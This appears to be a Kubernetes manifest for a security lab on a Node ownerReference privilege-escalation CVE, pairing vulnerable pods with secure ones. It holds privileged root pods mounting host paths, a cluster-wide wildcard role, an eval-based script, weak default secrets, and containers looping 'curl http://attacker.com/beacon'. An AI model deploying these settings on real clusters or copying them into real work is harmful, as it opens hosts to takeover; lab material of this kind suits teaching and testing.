apiVersion: v1
kind: Namespace
metadata:
  name: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.severity: "critical"
    kubeshadow.category: "privilege-escalation"
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: vulnerable-sa
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: vulnerable-cluster-role
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: ["apps"]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: ["extensions"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: vulnerable-cluster-role-binding
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: vulnerable-cluster-role
subjects:
- kind: ServiceAccount
  name: vulnerable-sa
  namespace: cve-2025-5187-lab
---
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod-with-node-owner
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
  annotations:
    kubeshadow.vulnerable: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.severity: "critical"
    kubeshadow.description: "CVE-2025-5187 Node ownerReference vulnerability"
    kubeshadow.exploit: "node-owner-reference"
    kubeshadow.payload: "curl http://attacker.com/beacon"
    kubeshadow.impact: "Privilege Escalation"
    kubeshadow.cvss: "9.8"
    kubeshadow.vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  ownerReferences:
  # Vulnerable ownerReference pointing to a Node
  - apiVersion: v1
    kind: Node
    name: worker-node-1
    uid: "00000000-0000-0000-0000-000000000001"
    controller: true
    blockOwnerDeletion: true
spec:
  serviceAccountName: vulnerable-sa
  containers:
  - name: vulnerable-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Vulnerable pod with node ownerReference'; sleep 30; done"]
    securityContext:
      # Vulnerable security context
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: host-var
      mountPath: /host-var
      readOnly: false
    - name: host-etc
      mountPath: /host-etc
      readOnly: false
    env:
    - name: VULNERABLE_ENV
      value: "CVE-2025-5187"
    - name: NODE_OWNER_REFERENCE
      value: "true"
    - name: EXPLOIT_PAYLOAD
      value: "curl http://attacker.com/beacon"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: host-var
    hostPath:
      path: /var
      type: Directory
  - name: host-etc
    hostPath:
      path: /etc
      type: Directory
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod-with-node-owner
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.malicious: "true"
  annotations:
    kubeshadow.malicious: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.severity: "critical"
    kubeshadow.description: "CVE-2025-5187 Malicious pod with node ownerReference"
    kubeshadow.exploit: "node-owner-reference"
    kubeshadow.payload: "curl http://attacker.com/beacon"
    kubeshadow.impact: "Privilege Escalation"
    kubeshadow.cvss: "9.8"
    kubeshadow.vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  ownerReferences:
  # Malicious ownerReference pointing to a Node
  - apiVersion: v1
    kind: Node
    name: worker-node-2
    uid: "00000000-0000-0000-0000-000000000002"
    controller: true
    blockOwnerDeletion: true
spec:
  serviceAccountName: vulnerable-sa
  containers:
  - name: malicious-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do curl http://attacker.com/beacon; sleep 300; done"]
    securityContext:
      # Malicious security context
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: host-var
      mountPath: /host-var
      readOnly: false
    - name: host-etc
      mountPath: /host-etc
      readOnly: false
    - name: host-opt
      mountPath: /host-opt
      readOnly: false
    - name: host-home
      mountPath: /host-home
      readOnly: false
    env:
    - name: MALICIOUS_ENV
      value: "CVE-2025-5187"
    - name: NODE_OWNER_REFERENCE
      value: "true"
    - name: EXPLOIT_PAYLOAD
      value: "curl http://attacker.com/beacon"
    - name: ATTACKER_URL
      value: "http://attacker.com/beacon"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: host-var
    hostPath:
      path: /var
      type: Directory
  - name: host-etc
    hostPath:
      path: /etc
      type: Directory
  - name: host-opt
    hostPath:
      path: /opt
      type: Directory
  - name: host-home
    hostPath:
      path: /home
      type: Directory
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Pod
metadata:
  name: exploit-pod-with-node-owner
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.exploit: "true"
  annotations:
    kubeshadow.exploit: "node-owner-reference"
    kubeshadow.cve: "2025-5187"
    kubeshadow.severity: "critical"
    kubeshadow.description: "CVE-2025-5187 Exploit pod with node ownerReference"
    kubeshadow.payload: "curl http://attacker.com/beacon"
    kubeshadow.impact: "Privilege Escalation"
    kubeshadow.cvss: "9.8"
    kubeshadow.vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  ownerReferences:
  # Exploit ownerReference pointing to a Node
  - apiVersion: v1
    kind: Node
    name: worker-node-3
    uid: "00000000-0000-0000-0000-000000000003"
    controller: true
    blockOwnerDeletion: true
spec:
  serviceAccountName: vulnerable-sa
  containers:
  - name: exploit-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Exploit pod with node ownerReference'; curl http://attacker.com/beacon; sleep 300; done"]
    securityContext:
      # Exploit security context
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: host-var
      mountPath: /host-var
      readOnly: false
    - name: host-etc
      mountPath: /host-etc
      readOnly: false
    - name: host-opt
      mountPath: /host-opt
      readOnly: false
    - name: host-home
      mountPath: /host-home
      readOnly: false
    - name: host-tmp
      mountPath: /host-tmp
      readOnly: false
    env:
    - name: EXPLOIT_ENV
      value: "CVE-2025-5187"
    - name: NODE_OWNER_REFERENCE
      value: "true"
    - name: EXPLOIT_PAYLOAD
      value: "curl http://attacker.com/beacon"
    - name: ATTACKER_URL
      value: "http://attacker.com/beacon"
    - name: EXPLOIT_INTERVAL
      value: "300"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: host-var
    hostPath:
      path: /var
      type: Directory
  - name: host-etc
    hostPath:
      path: /etc
      type: Directory
  - name: host-opt
    hostPath:
      path: /opt
      type: Directory
  - name: host-home
    hostPath:
      path: /home
      type: Directory
  - name: host-tmp
    hostPath:
      path: /tmp
      type: Directory
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod-without-node-owner
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.secure: "true"
  annotations:
    kubeshadow.secure: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.description: "Secure pod configuration for CVE-2025-5187"
    kubeshadow.mitigation: "Proper pod configuration without node ownerReference"
spec:
  serviceAccountName: default
  containers:
  - name: secure-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Secure pod without node ownerReference'; sleep 30; done"]
    securityContext:
      # Secure security context
      runAsUser: 1000
      runAsGroup: 1000
      runAsNonRoot: true
      privileged: false
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: var-cache
      mountPath: /var/cache
    env:
    - name: SECURE_ENV
      value: "CVE-2025-5187-mitigated"
    - name: NODE_OWNER_REFERENCE
      value: "false"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: tmp
    emptyDir: {}
  - name: var-cache
    emptyDir: {}
---
apiVersion: v1
kind: Pod
metadata:
  name: normal-pod-without-node-owner
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.normal: "true"
  annotations:
    kubeshadow.normal: "true"
    kubeshadow.cve: "2025-5187"
    kubeshadow.description: "Normal pod configuration for CVE-2025-5187"
    kubeshadow.mitigation: "Normal pod configuration without node ownerReference"
spec:
  serviceAccountName: default
  containers:
  - name: normal-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do echo 'Normal pod without node ownerReference'; sleep 30; done"]
    securityContext:
      # Normal security context
      runAsUser: 1000
      runAsGroup: 1000
      runAsNonRoot: true
      privileged: false
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: var-cache
      mountPath: /var/cache
    env:
    - name: NORMAL_ENV
      value: "CVE-2025-5187-normal"
    - name: NODE_OWNER_REFERENCE
      value: "false"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  - name: tmp
    emptyDir: {}
  - name: var-cache
    emptyDir: {}
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: vulnerable-config
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
data:
  exploit.sh: |
    #!/bin/bash
    # Vulnerable script for CVE-2025-5187
    echo "Vulnerable script for CVE-2025-5187"
    
    # This script is vulnerable to privilege escalation through node ownerReference
    if [ ! -z "$1" ]; then
        eval "$1"
    fi
    
    # Another vulnerable pattern
    echo "Executing: $@"
    $@
    
    # Exploit payload
    curl http://attacker.com/beacon
---
apiVersion: v1
kind: Secret
metadata:
  name: vulnerable-secret
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
type: Opaque
data:
  # Vulnerable secret data
  # admin:admin (base64 encoded)
  admin: YWRtaW46YWRtaW4=
  # root:password (base64 encoded)
  root: cm9vdDpwYXNzd29yZA==
  # user:user (base64 encoded)
  user: dXNlcjp1c2Vy
  # token:secret (base64 encoded)
  token: dG9rZW46c2VjcmV0
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-service
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
spec:
  selector:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
  ports:
  - port: 80
    targetPort: 80
    protocol: TCP
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: vulnerable-network-policy
  namespace: cve-2025-5187-lab
  labels:
    kubeshadow.lab: "true"
    kubeshadow.cve: "2025-5187"
spec:
  podSelector:
    matchLabels:
      kubeshadow.lab: "true"
      kubeshadow.cve: "2025-5187"
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubeshadow.lab: "true"
    - podSelector:
        matchLabels:
          kubeshadow.lab: "true"
    ports:
    - protocol: TCP
      port: 80
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubeshadow.lab: "true"
    - podSelector:
        matchLabels:
          kubeshadow.lab: "true"
    ports:
    - protocol: TCP
      port: 80
  - to: []
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
